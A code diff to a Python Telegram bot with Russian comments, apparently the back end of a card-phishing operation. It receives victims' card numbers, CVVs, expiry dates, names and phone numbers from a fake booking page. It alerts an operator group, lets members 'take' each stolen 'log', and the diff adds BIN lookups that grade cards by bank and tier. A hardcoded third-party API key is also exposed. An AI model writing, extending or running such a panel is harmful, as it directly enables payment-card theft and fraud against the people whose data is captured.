@@ -1,4 +1,4 @@
-# bot.py - Исправленная версия с проверкой онлайн
+# bot.py - Исправленная версия с проверкой онлайн и интеграцией HandyAPI
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from fastapi import FastAPI
@@ -13,6 +13,10 @@ from contextlib import contextmanager
 bot = Bot(token=config.TOKEN)
 dp = Dispatcher()
 app = FastAPI()
+
+# API ключ и базовый URL для HandyAPI
+HANDYAPI_KEY = "HAS-0YH7P8rbGpwLRHq4gM0BX6K"
+HANDYAPI_BASE_URL = "https://data.handyapi.com/bin/"
 
 # Инициализация базы данных
 def init_db():
@@ -42,6 +46,67 @@ def get_db_connection():
     finally:
         conn.close()
 
+# Функция для получения информации о карте через HandyAPI
+async def get_card_info(bin_number):
+    """Получает информацию о карте по BIN через HandyAPI"""
+    try:
+        async with httpx.AsyncClient() as client:
+            response = await client.get(
+                f"{HANDYAPI_BASE_URL}{bin_number}",
+                headers={"Authorization": f"Bearer {HANDYAPI_KEY}"}
+            )
+            
+            if response.status_code == 200:
+                data = response.json()
+                
+                # Получаем флаг страны из кода A2
+                country_code = data.get("Country", {}).get("A2", "").upper()
+                flag_emoji = get_country_flag_emoji(country_code)
+                
+                return {
+                    "flag": flag_emoji,
+                    "country": data.get("Country", {}).get("Name", "N/A").upper(),
+                    "brand": data.get("Scheme", "N/A"),
+                    "type": data.get("Type", "N/A"),
+                    "level": data.get("CardTier", "N/A"),
+                    "bank": data.get("Issuer", "N/A"),
+                    "status": data.get("Status", "N/A"),
+                    "success": True
+                }
+            else:
+                return {"success": False, "error": f"HTTP {response.status_code}"}
+                
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+# Функция для получения эмодзи флага по коду страны
+def get_country_flag_emoji(country_code):
+    """Конвертирует код страны в эмодзи флага"""
+    if len(country_code) != 2:
+        return "🏴"
+    
+    # Конвертируем буквы в региональные индикаторы
+    flag_emoji = ''.join(chr(ord(c) + 127397) for c in country_code.upper())
+    return flag_emoji
+
+# Функция для форматирования информации о карте
+def format_card_info(card_info):
+    """Форматирует информацию о карте в красивый текст с эмодзи"""
+    if not card_info.get("success"):
+        return "❌ Информация о карте недоступна"
+    
+    # Проверяем статус запроса
+    if card_info.get("status") != "SUCCESS":
+        return f"❌ Статус запроса: {card_info.get('status', 'UNKNOWN')}"
+    
+    return (
+        f"{card_info['flag']} {card_info['country']}\n"
+        f"🏷️ <b>Brand:</b> {card_info['brand']}\n"
+        f"💳 <b>Type:</b> {card_info['type']}\n"
+        f"⭐ <b>Level:</b> {card_info['level']}\n"
+        f"🏦 <b>Bank:</b> {card_info['bank']}\n"
+    )
+
 # Уведомление от сервера
 @app.post("/notify")
 async def notify(data: dict):
@@ -56,6 +121,11 @@ async def notify(data: dict):
             cursor = conn.cursor()
             
             if step == "card_number_only":
+                # Получаем BIN из номера карты (первые 6 цифр)
+                bin_number = masked_pan[:6]
+                card_info = await get_card_info(bin_number)
+                card_info_text = format_card_info(card_info)
+                
                 cursor.execute('''
                     INSERT OR REPLACE INTO logs (session_id, masked_pan, booking_id, client_id, step, updated_at)
                     VALUES (?, ?, ?, ?, ?, ?)
@@ -67,12 +137,13 @@ async def notify(data: dict):
                     f"🆔 #{booking_id} || #{client_id}\n"
                     f"🎯 Пользователь ввел карту, приготовиться!\n\n"
                     f"💳 Номер карты:\n"
-                    f"🔹 {masked_pan}\n"
-                    f"🔹 {card_with_spaces}\n\n"
+                    f"🔹 <code>{masked_pan}</code>\n"
+                    f"🔹 <code>{card_with_spaces}</code>\n\n\n"
+                    f"{card_info_text}\n\n"
                     f"⏳ Ожидаем CVV и expiry date..."
                 )
                 
-                await bot.send_message(config.GROUP_ID, message_text)
+                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML")
                 
             elif step == "completed":
                 cvv = data.get("cvv", "N/A")
@@ -90,15 +161,15 @@ async def notify(data: dict):
                     f"🆔 #{booking_id} || #{client_id}\n"
                     f"🔔 Пользователь ожидает 🔔\n\n"
                     f"💳 Номер карты:\n\n"
-                    f"🔹 {masked_pan}\n"
-                    f"🔹 {card_with_spaces}\n"
+                    f"🔹 <code>{masked_pan}</code>\n"
+                    f"🔹 <code>{card_with_spaces}</code>\n\n"
                 )
                 
                 kb = InlineKeyboardMarkup(inline_keyboard=[
                     [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
                 ])
                 
-                await bot.send_message(config.GROUP_ID, message_text, reply_markup=kb)
+                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML", reply_markup=kb)
                 
             else:
                 cursor.execute('''
@@ -112,15 +183,15 @@ async def notify(data: dict):
                     f"🆔 #{booking_id} || #{client_id}\n"
                     f"🔔 Пользователь ожидает 🔔\n\n"
                     f"💳 Номер карты:\n\n"
-                    f"🔹 {masked_pan}\n"
-                    f"🔹 {card_with_spaces}\n"
+                    f"🔹 <code>{masked_pan}</code>\n"
+                    f"🔹 <code>{card_with_spaces}</code>\n\n"
                 )
                 
                 kb = InlineKeyboardMarkup(inline_keyboard=[
                     [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
                 ])
                 
-                await bot.send_message(config.GROUP_ID, message_text, reply_markup=kb)
+                await bot.send_message(config.GROUP_ID, message_text, parse_mode="HTML", reply_markup=kb)
 
             conn.commit()
 
@@ -229,12 +300,23 @@ async def take_log(callback: types.CallbackQuery):
         booking_id = log['booking_id'] or "N/A"
         client_id = log['client_id'] or "N/A"
         
+        # Получаем информацию о карте для полного номера
+        full_pan = card.get('full_pan', '')
+        if full_pan:
+            bin_number = full_pan[:6]
+            card_info = await get_card_info(bin_number)
+            card_info_text = format_card_info(card_info)
+        else:
+            card_info_text = "❌ Информация о карте недоступна"
+        
         text = (
             f"Лог #{booking_id} || #{client_id}\n\n"
-            f"💳  Карта: {card.get('full_pan')}\n"
+            f"💳  Карта: <code>{full_pan}</code>\n"
             f"🗓️  Срок действия карты: {card.get('expire_date')}\n"
-            f"🔒  CVV: {card.get('cvv')}\n"
-            f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n\n"
+            f"🔒  CVV: {card.get('cvv')}\n\n"
+            f"📊 <b>Информация о карте:</b>\n"
+            f"{card_info_text}\n\n"
+            f"👤  Имя: {customer.get('name')} {customer.get('surname')}\n"
             f"📞  Номер: {customer.get('phone')}\n\n"
             f"💸  Сумма: {booking.get('total_amount')}.00 AED"
         )
@@ -253,7 +335,7 @@ async def take_log(callback: types.CallbackQuery):
             ]
         ])
 
-        await bot.send_message(callback.from_user.id, text, reply_markup=management_kb)
+        await bot.send_message(callback.from_user.id, text, parse_mode="HTML", reply_markup=management_kb)
         
         new_kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=f"Лог взял @{callback.from_user.username}", callback_data="already_taken")]
@@ -263,7 +345,6 @@ async def take_log(callback: types.CallbackQuery):
         await callback.answer()
 
 # НОВЫЙ ОБРАБОТЧИК: Проверка онлайн статуса
-# bot.py - ОБНОВЛЕННЫЙ ОБРАБОТЧИК check_online
 @dp.callback_query(F.data.startswith("check_online:"))
 async def check_online_status(callback: types.CallbackQuery):
     session_id = callback.data.split(":")[1]
